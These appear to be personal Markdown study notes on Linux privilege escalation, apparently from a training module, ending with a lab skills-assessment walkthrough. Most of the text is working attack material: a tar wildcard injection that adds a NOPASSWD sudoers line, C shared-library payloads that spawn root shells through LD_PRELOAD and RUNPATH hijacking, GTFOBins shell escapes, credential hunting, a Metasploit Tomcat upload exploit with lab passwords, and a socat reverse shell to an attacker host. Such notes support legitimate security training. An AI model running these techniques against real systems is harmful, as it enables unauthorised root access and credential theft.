## Table of Contents
- [Scripts for Enumeration](#Scripts)
- [Enumeration](#Enumeration)
- [Kernel Exploits](#kernel-exploits)
- [Vulnerable Services](#vulnerable-services)
- [User Installed Software](#user-installed-software)
- [Cron Job Abuse](#cron-job-abuse)
- [SUID/GUID Special Permissions](#special-permissions)
- [Sudo Rights Abuse](#sudo-rights-abuse)
- [PATH Abuse](#path-abuse)
- [Wildcard Abuse](#wildcard-abuse)
- [Credential Hunting](#credential-hunting)
- [Shared Libraries](#shared-libraries)
- [Shared Object Hijacking](#shared-object-hijacking)
- [Privileged Groups](#privileged-groups)
    - LXC / LXD
    - Docker
    - Disk
    - ADM
- [Miscellaneous Techniques](#miscellaneous-techniques)
    - Passive Traffic Capture
    - Weak NFS Privileges
    - Keyloggers
    - Inside Services  
- [Skills Assesment](#skills-assesment)  

<br />

## Scripts

These are four scripts that are used to enumerate a machine  
They output a lot of the same stuff, but there are some differences  
Test them all out and see which one you like best  

**LinPEAS:**  
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS  
(`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`)  

**LinEnum:**  
https://github.com/rebootuser/LinEnum  

**Unix Privesc:**  
http://pentestmonkey.net/tools/audit/unix-privesc-check  

**Linprivchecker.py:**  
https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py  

<br />

## Enumeration

**Running Services**: A mis-configured or vulnerable service running as root can be an easy win for privlege escalation. List processes running as root: `ps -aux | grep root`  

Checking a users **bash history** is important because they could be passing passwords as arguments on the command line, working with git repos, setting up cron jobs, etc.  
The `history` command, by default, will show commands from the current session. `history` stores commands in RAM, until you log out of the terminal, at which point  they are written to disk in the `~/.bash_history` file. So, by default, `.bash_history` will contain a history of up to 1000 commands up to the last logged out session.  

**Sudo**: list a user's sudo privileges: `sudo -l`  

**Configuration files**: Its worth searching through all files that end in extensions `.conf` and `.config` for usernames, passwords, and other secrets  

**Readable Shadow File**: If the shadow file is readable, you will be able to gather passowrd hashes for all users who have a password set  

**Password hashes in `/etc/passwd`**: Occasionally, you will see password hashes directly in the `/etc/passwd` file. This configuration, while not common, can sometimes be seen on embedded devices and routers  

**Cron Jobs**: In conjunction with other misconfigurations such as relative paths or weak permissions, they can be leveraged to escalate privileges when a scheduled cron runs. `ls -la /etc/cron.daily/`  

**Unmounted File Systems and Additional Drives:** If you discover you can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges  
- `lsblk` 

**Writeable Directories**: `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`  

**Writeable Files**: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` 

**SETUID and SETGID Permissions**  


<br />

## Kernel Exploits  

A quick way to identify kernel exploits is to use the command `uname -a` and search Google for the kernel version.  

Example: we are given a box running an old version of Ubuntu  
`uname -a` shows:  
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
We can search google for "linux 4.4.0-116-generic exploit" and find an exploit-db page containing a c file. We just need to download this c file, move it to the target box, compile with gcc, run it, and we get a root shell.  

Don't use kernel exploits if you can avoid it. They can crash the machine or put it in an unstable state  
They can also produce a lot of stuff in the `sys.log`  
So kernel exploits should be the last resort.  

<br />

## Vulnerable Services

Many services may be found which have flaws that can be leveraged to escalate privileges.  

An example is the popular terminal multiplexer `Screen`. Version 4.5.0 suffers from a privlege escalation vulnerability due to a lack of permissions check when opening a log file  

<br />

## User Installed Software

Has the user installed some third party software that might be vulnerable?  
Common locatons for user installed software:  
`/usr/local`, `/usr/local/src`, `/usr/local/bin`, `/opt`, `/home`, `/var`, `/usr/src`  
Debian: `dpkg -l`  
CentOS, OpenSuse, Fedora, RHEL: `rpm -qa`   
OpenBSD, FreeBSD: `pkg_info`  

<br />

## Cron Job Abuse

The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, days, months, weeks, commands.  
For example, the entry: `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.  

The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused  

Certain applications create cron files in the `/etc/cron.d` directory, and may be misconfigured to allow a non-root user to edit them 

We can use `pspy` to find cron jobs that are running. `pspy` can be used to see commands run by other users, cron jobs, and more. It works by scanning procfs.  

Other cronjob enumeration commands:  
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### Cron Job Abuse Example

Run `pspy` to watch for running crons:  
- Download and build pspy:  
    - `git clone https://github.com/DominicBreuker/pspy.git`  
    - `cd pspy`  
    - `go build`
- Move to target  
- `./pspy -pf -i 1000`  

After waiting a bit, we can see the command `/bin/bash /dmz-backups/backup.sh` is being run about every three minutes  

`ls -la /dmz-backups/backup.sh` show us that we have write permissions  
We could have found this earlier as well, by listing all files which we have write permissions on with:  
- `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`  

We can copy the script, modify it to include a reverse shell command, and then replace it and we get a reverse shell as root connecting back to a nc listener the next time the cron runs  

<br />

## Special Permissions

**SUID Bit**  
Find all root-owned files with the suid bit set:  
`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`  

**Set-Group-ID Permission**: Another special permission which allows us to run binaries as if we are part of the group that created them. These files can be enumerated with the following:  
`find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`  
These files can be leveraged in the same manner as setuid binaries to escalate privileges  

### GTFOBins

The GTFOBins project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:  
`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`  

<br />

## Sudo Rights Abuse  

When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`  

Any rights entries with the NOPASSWD option can be seen without entering a password.  

Basically just check GTFOBins to see if there is a way to get a shell with a binary if we can run it with sudo  

<br />

## Path Abuse

I don't think this section of the module is that great. `HTB_Photobomb.md` has a PATH abuse example in the privesc section.  

Putting `.` in the path  
If you put a dot in your path you won't have to write ./binary to be able to execute it  
Why would people do this? Because they are lazy  
This article explains it: https://hackmag.com/security/reach-the-root/  

<br />

## Wildcard Abuse

A wildcard character can be used as replacement for other characters and is interpreted by the shell before other actions. (ie: * ? [] ~ -)  

Take the following cron job as an example:  
`*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *`  

We can leverage the wild card `*` at the end of the cron job. We can do this by writing out the necessary commands as file names.  

`man tar` will show `--checkpoint` and `--checkpoint-action` flags, which is what we will use to abuse this wildcard  

`'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh`  
`echo "" > "--checkpoint-action=exec=sh root.sh"`  
`echo "" > --checkpoint=1`  

<br />

## Credential Hunting  

Credentials can often be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, as user's bash history file, backup (`.bak`) files, within database files, or even in text files.  

The `/var` directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files.  

The `spool` or `mail` directories, if accessible may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root.  

List files with config in the name:  
`find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`  

LinEnum can help:  
`./LinEnum.sh -t -k passwords`

### SSH Keys

We may locate a private key for another, more privileged user. We may also find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys, check the `known_hosts` (`~/.ssh/known_hosts`) file to find targets.  

<br />

## Shared Libraries

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file  

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions in this library are given preference over the default ones.  

### LD_PRELOAD Privilege Escalation

This is an example. We have sudo rights to restart the Apache service.  
Apache is not in GTFOBins and the `/etc/sudoers` entry is written specifying the absolute path. We can exploit the `LD_PRELOAD` variable to run a custom shared library file  

Compile the folling library:  
```C
/* gcc -fPIC -shared -o root.so root.c -nostartfiles */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then run:  
`sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`  
and we get a root shell  

<br />

## Shared Object Hijacking  

As stated above, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the `readelf` utility:  
`readelf -d payroll | grep PATH`  

Example:  
We have a binary `payroll` that has `/development` as its runpath  
`ldd payroll` shows `/development/libshared.so` as a library that will be loaded  
Copy libc to /development:  
- `cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so`  

Now, running `./payroll` yields:  
`./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery`  

So, we can create a malicious library `libshared.so` with a function `dbquery()` which can contain whatever we want.  

```C
/* gcc src.c -fPIC -shared -o /development/libshared.so */

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

Now, executing `./payroll` gives us a root shell  

<br />

## Privileged Groups

### LXC / LXD  

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`  

use `id` to check if member of the `lxd` group  

This is very specific; just look it up. You get an alpine image, `lxd init`, import the image, start a container with `security.privileged=true`, and then mount the host filesystem  

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password.  
One example of this would be running the command:  
`docker run -v /root:/mnt -it ubuntu`  
This command creates a new Docker instance with the `/root` directory on the host file system mounted as a volume.  

### Disk 

Users within the `disk` group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.  

### ADM

Members of the `adm` group are able to real all logs in `/var/log`. This could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.  

<br />

## Miscellaneous Techniques  

### Passive Traffic Capture

If `tcpdump` is installed, unprivileged users may be able to capture network traffic. Several tools exist such as `net-credz` and `PCredz` that can be used to examine data being passed on the wire.  

### Weak NFS Privileges

Network File Sharing (NFS) is a protocol that allows you to share directories and files with other Linux clients over a network  
If you find a machine that has a NFS share, you might be able to use that to escalate privleges depending on how it is configured  
```bash
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
```
If that succeeds, then you can go to /tmp/share
There might be some interesting stuff there  

If you have write privleges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file  
If it says that it is the root-user that has created the file, it is good news  
They you can create a file and set with suid-permission from your attacking machine  
And then execute it with your low privilege shell  

### Steal a Password Through a KeyLogger

If you have access to an account with sudo-rights, but you don't have its password, you can install a keylogger to get it

### Service Only Available from Inside

It might be the case that the user is running some service that is only available from that host  
You can't connect to the service from the outside. It might be a development server, a database, or anything else  
These services could be running as root, or they might have vulnerabilities  
Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?  
`netstat -anlp`, `netstat -ano`  

### Hijacking Tmux Sessions

<br />  

## Skills Assesment  

flag1 is just sitting in a hidden `.config` directory in our home directory  

We can read barry's `.bash_history` file, and he has a plaintext password (i_l0ve_s3cur1ty!) in there  

barry is a member of `adm` group, and we can thus read flag3 which is in /var/log  

This is where it gets interesting:  

`netstat -alnp` will show us that there is a webserver running on `0.0.0.0:8080`  
Navigating to this webserver in our browser, we can see it is the default Tomcat welcome page. There is a link to the manager login page which asks for credentials and tells us they can be configured in `/etc/tomcat-users.xml`  

Barry does not have access to that file, but has made a backup of it `/etc/tomcat-users.xml.bk` which we can read the tomcat login out of  

This allows us to login to the tomcat manager web portal  
To get a reverse shell, we can use metasploit:  
- `use exploit/multi/http/tomcat_mgr_upload`  
- `set httpPassword T0mc@t_s3cret_p@ss!`
- `set httpUsername tomcatadm`
- `set rhosts 10.129.127.128`  
- `set rport 8080`
- `set lhost tun0`  
- `run`  

This will get us a meterpreter session as the tomcat user on the box, which allows us to read flag4  

`sudo -l` shows us we can execute the `busctl` binary with no password  
Searching `busctl` in `GTFOBins` we can see that it is possible to escalate with sudo  

The tricky part here is we need a fully interactive shell for this to work. importing pty with python works, but stty stuff gets messed up. Instead, we will drop `socat` onto the box, and use that to get a fully interactive shell:  

Download statically compiled socat for x86_64:  
`https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat`  
(I tried to curl this, and it messed up)  
upload socat with meterpreter  

Run listener with:  
```bash
socat file:`tty`,raw,echo=0 tcp-listen:8686  
```
Run reverse shell from the target with:  
```bash
./socat_static exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.189:8686
```
And we get a fully interactive reverse shell  

Now, using what GTFOBins says, we can run:  
`sudo busctl --show-machine`  
And when the less-like interface cli comes up, type `!/bin/sh` to get a shell as root  

This gets us flag5
